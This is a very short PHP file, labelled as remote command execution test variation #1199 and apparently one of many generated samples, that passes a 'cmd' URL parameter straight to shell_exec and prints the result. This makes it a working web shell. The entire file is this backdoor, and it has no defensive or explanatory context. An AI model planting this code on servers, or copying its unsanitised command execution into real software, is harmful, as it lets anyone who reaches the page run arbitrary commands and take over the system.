<?php
// RCE test variation #1199
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>